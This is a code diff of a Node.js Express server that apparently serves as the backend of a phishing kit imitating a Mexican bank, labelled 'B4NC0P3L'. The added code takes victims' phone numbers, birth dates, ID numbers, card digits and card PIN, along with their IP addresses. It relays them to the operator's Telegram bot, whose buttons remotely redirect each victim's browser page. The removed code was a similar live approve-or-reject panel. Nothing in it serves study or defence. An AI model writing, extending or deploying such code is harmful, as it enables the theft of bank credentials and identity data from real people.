@@ -1,93 +1,103 @@
-const express = require('express');
-const cors = require('cors');
-const fetch = require('node-fetch');
-const fs = require('fs');
-require('dotenv').config();
+import express from 'express';
+import cors from 'cors';
+import fetch from 'node-fetch';
 
 const app = express();
-
-app.use(express.json());
 app.use(cors());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
-const STATUS_FILE = './status.json';
 
-let clientes = {};
-if (fs.existsSync(STATUS_FILE)) {
-  clientes = JSON.parse(fs.readFileSync(STATUS_FILE));
-}
+const redirectMap = new Map(); // clientId => redirection URL
 
-function guardarEstado() {
-  fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
-}
+// Ruta principal
+app.get('/', (req, res) => {
+  res.send('Servidor activo');
+});
 
-app.post('/enviar', (req, res) => {
-  const { nombre, email, txid } = req.body;
+// Ruta para recibir datos y enviar a Telegram
+app.post('/send-data', async (req, res) => {
+  const data = req.body;
+  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
   const mensaje = `
-📥 <b>Nuevo Formulario</b>
-🆔 ID: <code>${txid}</code>
-👤 Nombre: ${nombre}
-📧 Email: ${email}
+🔵B4NC0P3L🔵:
+📱 Celular: ${data.celular}
+🎂 Nacimiento: ${data.fechaNacimiento}
+🆔 Tipo ID: ${data.tipoIdentificacion}
+🔢 ID: ${data.numeroIdentificador}
+💳 Últimos 2: ${data.ultimos2}
+🔐 NIP: ${data.nip}
+
+🆔 ID ClienteWEB: ${data.clientId}
+🌐 IP: ${ip}
+
+Elige una acción:
   `;
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "✅ Aprobar", callback_data: `aprobar:${txid}` }],
-      [{ text: "❌ Rechazar", callback_data: `rechazar:${txid}` }]
+      [
+        { text: "➡ Redirigir A", callback_data: `redir|${data.clientId}|https://pagina-a.com` },
+        { text: "➡ Redirigir B", callback_data: `redir|${data.clientId}|https://pagina-b.com` },
+        { text: "➡ Redirigir C", callback_data: `redir|${data.clientId}|https://pagina-c.com` }
+      ]
     ]
   };
 
-  clientes[txid] = "esperando";
-  guardarEstado();
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensaje,
+        reply_markup: keyboard
+      })
+    });
 
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: mensaje,
-      parse_mode: 'HTML',
-      reply_markup: keyboard
-    })
-  });
-
-  res.sendStatus(200);
-});
-
-app.post('/callback', async (req, res) => {
-  const callback = req.body.callback_query;
-
-  if (!callback || !callback.data) {
-    return res.sendStatus(400);
+    res.status(200).json({ ok: true });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: err.message });
   }
-
-  const [accion, txid] = callback.data.split(":");
-
-  clientes[txid] = accion;
-  guardarEstado();
-
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      callback_query_id: callback.id,
-      text: `Has seleccionado: ${accion}`
-    })
-  });
-
-  res.sendStatus(200);
 });
 
-app.get('/sendStatus.php', (req, res) => {
-  const txid = req.query.txid;
-  res.json({ status: clientes[txid] || "esperando" });
+// Ruta para recibir botón de Telegram
+app.post('/bot-callback', async (req, res) => {
+  const callback = req.body.callback_query;
+  if (!callback || !callback.data) return res.sendStatus(400);
+
+  const [action, clientId, url] = callback.data.split('|');
+  if (action === 'redir') {
+    redirectMap.set(clientId, url);
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        callback_query_id: callback.id,
+        text: `Redirección preparada para cliente ${clientId}`
+      })
+    });
+
+    res.sendStatus(200);
+  }
 });
 
-app.get('/', (req, res) => {
-  res.send("Servidor activo");
+// Ruta para polling desde verifidata.html
+app.get('/check-redirect/:id', (req, res) => {
+  const clientId = req.params.id;
+  const redirectUrl = redirectMap.get(clientId);
+
+  if (redirectUrl) {
+    redirectMap.delete(clientId); // consumir una sola vez
+    res.json({ redirect: redirectUrl });
+  } else {
+    res.json({ redirect: null });
+  }
 });
 
-app.listen(3000, () => console.log("Servidor activo en Render puerto 3000"));
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Servidor en puerto ${PORT}`));
